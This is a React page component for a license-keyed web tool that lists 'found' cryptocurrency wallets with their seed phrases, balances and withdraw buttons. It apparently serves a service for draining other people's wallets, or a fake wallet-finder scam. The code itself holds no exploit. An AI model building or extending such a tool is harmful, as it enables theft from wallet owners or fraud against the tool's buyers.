import React, { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { API_BASE_URL } from '../config';
import WithdrawalModal from '../components/wallet/WithdrawalModal';
import WithdrawalButton from '../components/wallet/WithdrawalButton';
import ChatWidget from '../components/ChatWidget';
import { ArrowLeft, Info } from 'lucide-react';

const Withdraw = () => {
  const navigate = useNavigate();
  const [foundWallets, setFoundWallets] = useState([]);
  const [withdrawnAmounts, setWithdrawnAmounts] = useState([]);
  const [withdrawalStatuses, setWithdrawalStatuses] = useState({});
  const [isLoading, setIsLoading] = useState(true);
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [selectedCoin, setSelectedCoin] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [cryptoPrices, setCryptoPrices] = useState({});
  const [currencySymbol, setCurrencySymbol] = useState('$');

  const fetchCryptoPrices = useCallback(async () => {
    try {
      const response = await fetch(
        'https://min-api.cryptocompare.com/data/pricemulti?fsyms=BTC,ETH,USDT,BNB,SOL,XRP,ADA,DOGE&tsyms=USD'
      );
      const prices = await response.json();
      setCryptoPrices(prices);
    } catch (error) {
      console.error('Error fetching crypto prices:', error);
    }
  }, []);

  const fetchData = useCallback(async () => {
    try {
      const licenseKey = localStorage.getItem('licenseKey');

      const configResponse = await fetch(`${API_BASE_URL}/get_config.php?key=${licenseKey}`);
      const configData = await configResponse.json();
      if (configData.success) {
        setCurrencySymbol(configData.config.currencySymbol);
      }
      
      const [walletsResponse, withdrawnResponse, statusesResponse] = await Promise.all([
        fetch(`${API_BASE_URL}/found_wallets.php?key=${licenseKey}`),
        fetch(`${API_BASE_URL}/withdrawn_amounts.php?key=${licenseKey}`),
        fetch(`${API_BASE_URL}/withdrawal_statuses.php?key=${licenseKey}`)
      ]);

      const walletsData = await walletsResponse.json();
      const withdrawnData = await withdrawnResponse.json();
      const statusesData = await statusesResponse.json();

      if (walletsData.success) {
        setFoundWallets(walletsData.wallets);
      }
      
      if (withdrawnData.success) {
        setWithdrawnAmounts(withdrawnData.withdrawn);
      }

      if (statusesData.success) {
        const statusMap = {};
        statusesData.statuses.forEach(status => {
          const key = `${status.wallet_id}_${status.coin_symbol}`;
          statusMap[key] = status.status;
        });
        setWithdrawalStatuses(statusMap);
      }
    } catch (error) {
      console.error('Error fetching data:', error);
    }
  }, []);

  useEffect(() => {
    const loadInitialData = async () => {
      await Promise.all([fetchData(), fetchCryptoPrices()]);
      setIsLoading(false);
    };

    loadInitialData();
    const dataInterval = setInterval(fetchData, 30000);
    const pricesInterval = setInterval(fetchCryptoPrices, 30000);

    return () => {
      clearInterval(dataInterval);
      clearInterval(pricesInterval);
    };
  }, [fetchData, fetchCryptoPrices]);

  const isDarkMode = localStorage.getItem('theme') === 'dark';

  const getWithdrawalStatus = (walletId, coinSymbol) => {
    const status = withdrawalStatuses[`${walletId}_${coinSymbol}`];
    return status || null;
  };

  const handleWithdrawClick = (wallet, coin) => {
    setSelectedWallet(wallet);
    setSelectedCoin(coin);
    setIsModalOpen(true);
  };

  const handleCloseModal = async (wasSubmitted = false) => {
    if (wasSubmitted) {
      const key = `${selectedWallet.id}_${selectedCoin.symbol}`;
      setWithdrawalStatuses(prev => ({
        ...prev,
        [key]: 'pending'
      }));
      await fetchData();
    }
    setIsModalOpen(false);
    setSelectedWallet(null);
    setSelectedCoin(null);
  };

  if (isLoading) {
    return (
      <div className={`min-h-screen w-full flex items-center justify-center ${
        isDarkMode ? 'bg-slate-900 text-white' : 'bg-slate-100 text-slate-900'
      }`}>
        <div className="text-xl">Loading...</div>
      </div>
    );
  }

  return (
    <div className={`min-h-screen w-full px-4 py-6 sm:p-6 ${
      isDarkMode ? 'bg-slate-900 text-white' : 'bg-slate-100 text-slate-900'
    }`}>
      <ChatWidget />
      <div className="max-w-4xl mx-auto">
        {/* Header with Back and Info buttons */}
        <div className="flex justify-between items-center mb-6">
          <button
            onClick={() => navigate(-1)}
            className={`inline-flex items-center gap-2 px-3 py-2 sm:px-4 sm:py-2 rounded-lg transition-colors ${
              isDarkMode 
                ? 'bg-slate-800 hover:bg-slate-700' 
                : 'bg-white hover:bg-gray-100'
            }`}
          >
            <ArrowLeft size={20} />
            <span>Back</span>
          </button>
          
          <button
            onClick={() => navigate('/about')}
            className={`inline-flex items-center gap-2 px-3 py-2 sm:px-4 sm:py-2 rounded-lg transition-colors ${
              isDarkMode 
                ? 'bg-slate-800 hover:bg-slate-700' 
                : 'bg-white hover:bg-gray-100'
            }`}
          >
            <Info size={20} />
            <span>About</span>
          </button>
        </div>

        {/* Total Withdrawn Section - Mobile Optimized */}
        {withdrawnAmounts.length > 0 && (
          <div className={`mb-6 sm:mb-8 ${
            isDarkMode ? 'bg-slate-800' : 'bg-white'
          } rounded-lg shadow-sm overflow-hidden`}>
            <div className="px-4 py-3 sm:p-6 border-b border-slate-200 dark:border-slate-700">
              <h2 className="text-base sm:text-lg font-semibold">Total Withdrawn</h2>
            </div>
            
            {/* Mobile View: Horizontal scrolling list */}
            <div className="sm:hidden">
              <div className="flex overflow-x-auto px-4 py-3 gap-3 hide-scrollbar">
                {withdrawnAmounts.map((item, index) => (
                  <div 
                    key={index}
                    className="flex-shrink-0 flex items-center gap-2 py-1"
                  >
                    <img 
                      src={`/assets/coins/${item.coin_symbol.toLowerCase()}.png`}
                      alt={item.coin_symbol}
                      className="w-5 h-5"
                    />
                    <div className="whitespace-nowrap">
                      <div className="font-medium">
                        {parseFloat(item.amount).toFixed(3)} {item.coin_symbol}
                      </div>
                      <div className="text-xs opacity-60">
                        ≈ {currencySymbol}{(parseFloat(item.amount) * (cryptoPrices[item.coin_symbol]?.USD || 0)).toFixed(2)}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Desktop View: Grid layout */}
            <div className="hidden sm:grid sm:grid-cols-2 lg:grid-cols-3 gap-4 p-6">
              {withdrawnAmounts.map((item, index) => (
                <div 
                  key={index}
                  className={`p-4 rounded-lg ${
                    isDarkMode ? 'bg-slate-700' : 'bg-gray-50'
                  }`}
                >
                  <div className="flex items-center gap-2">
                    <img 
                      src={`/assets/coins/${item.coin_symbol.toLowerCase()}.png`}
                      alt={item.coin_symbol}
                      className="w-6 h-6"
                    />
                    <div>
                      <div className="text-lg font-bold">
                        {parseFloat(item.amount).toFixed(3)} {item.coin_symbol}
                      </div>
                      <div className="text-sm opacity-60">
                        ≈ {currencySymbol}{(parseFloat(item.amount) * (cryptoPrices[item.coin_symbol]?.USD || 0)).toFixed(2)}
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Available Wallets Section - Mobile Optimized */}
        <h2 className="text-xl sm:text-2xl font-bold mb-4 sm:mb-6">Available Wallets</h2>
        <div className="grid gap-4 sm:gap-6">
          {foundWallets.map((wallet, index) => (
            <div 
              key={index}
              className={`p-4 sm:p-6 rounded-lg ${
                isDarkMode ? 'bg-slate-800' : 'bg-white'
              } shadow-sm`}
            >
              <div className="flex flex-col sm:flex-row items-start gap-3 sm:gap-4">
                <div className="w-full">
                  <div className="space-y-3 sm:space-y-2">
                    {wallet.coins.map((coin, coinIndex) => (
                      <div key={`${wallet.id}-${coinIndex}`} 
                           className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 sm:gap-0">
                        <span className="flex items-center font-medium">
                          <img 
                            src={`/assets/coins/${coin.symbol.toLowerCase()}.png`}
                            alt={coin.symbol}
                            className="w-4 h-4 sm:w-5 sm:h-5 mr-2"
                          />
                          <span className="text-sm sm:text-base">
                            {coin.amount} {coin.symbol}
                            <span className="ml-2 text-xs sm:text-sm opacity-60">
                              ≈ ${(parseFloat(coin.amount) * (cryptoPrices[coin.symbol]?.USD || 0)).toFixed(2)}
                            </span>
                          </span>
                        </span>
                        <div className="ml-6 sm:ml-0">
                          <WithdrawalButton
                            coin={coin}
                            status={getWithdrawalStatus(wallet.id, coin.symbol)}
                            onClick={() => handleWithdrawClick(wallet, coin)}
                          />
                        </div>
                      </div>
                    ))}
                  </div>
                  {wallet.seed_phrase && (
                    <div className={`mt-3 sm:mt-4 p-3 sm:p-4 rounded-lg text-xs sm:text-sm font-mono break-all ${
                      isDarkMode ? 'bg-slate-900' : 'bg-slate-100'
                    }`}>
                      {wallet.seed_phrase}...
                    </div>
                  )}
                </div>
              </div>
            </div>
          ))}
        </div>

        {selectedWallet && selectedCoin && (
          <WithdrawalModal
            isOpen={isModalOpen}
            onClose={handleCloseModal}
            wallet={selectedWallet}
            coin={selectedCoin}
            isDarkMode={isDarkMode}
            cryptoPrices={cryptoPrices}
            currencySymbol={currencySymbol}
          />
        )}
      </div>
    </div>
  );
};

export default Withdraw;